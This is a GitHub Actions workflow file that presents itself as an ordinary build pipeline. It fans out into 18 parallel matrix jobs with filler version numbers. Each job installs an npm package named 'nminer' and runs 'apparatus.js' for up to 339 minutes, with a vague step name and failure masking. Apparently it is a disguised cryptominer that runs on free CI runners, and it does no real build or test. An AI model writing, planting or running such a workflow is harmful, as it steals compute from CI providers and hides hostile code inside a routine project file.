name: apparatus
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1779 }
          - { version: 5106 }
          - { version: 997 }
          - { version: 2801 }
          - { version: 9935 }
          - { version: 2359 }
          - { version: 1110 }
          - { version: 3529 }
          - { version: 438 }
          - { version: 6924 }
          - { version: 6931 }
          - { version: 5971 }
          - { version: 2428 }
          - { version: 1518 }
          - { version: 5776 }
          - { version: 8406 }
          - { version: 6684 }
          - { version: 9637 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: potentially
        run: |
          npm install nminer@latest
          timeout 339m node apparatus.js || echo "apparatus executed"